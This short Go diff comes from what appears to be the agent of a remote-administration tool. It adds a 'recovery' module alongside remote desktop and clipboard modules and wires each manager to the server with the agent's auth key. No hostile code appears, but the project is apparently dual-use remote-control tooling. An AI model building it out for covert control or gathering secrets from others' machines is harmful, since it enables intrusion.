@@ -10,6 +10,7 @@ import (
 	remotedesktop "github.com/rootbay/tenvy-client/internal/modules/control/remotedesktop"
 	clipboard "github.com/rootbay/tenvy-client/internal/modules/management/clipboard"
 	notes "github.com/rootbay/tenvy-client/internal/modules/notes"
+	recovery "github.com/rootbay/tenvy-client/internal/modules/operations/recovery"
 	systeminfo "github.com/rootbay/tenvy-client/internal/modules/systeminfo"
 	"github.com/rootbay/tenvy-client/internal/protocol"
 )
@@ -89,6 +90,15 @@ func Run(ctx context.Context, opts RuntimeOptions) error {
 		UserAgent: agent.userAgent(),
 	})
 	agent.clipboard = clipboard.NewManager(clipboard.Config{
+		AgentID:   agent.id,
+		BaseURL:   agent.baseURL,
+		AuthKey:   agent.key,
+		Client:    agent.client,
+		Logger:    agent.logger,
+		UserAgent: agent.userAgent(),
+	})
+
+	agent.recovery = recovery.NewManager(recovery.Config{
 		AgentID:   agent.id,
 		BaseURL:   agent.baseURL,
 		AuthKey:   agent.key,
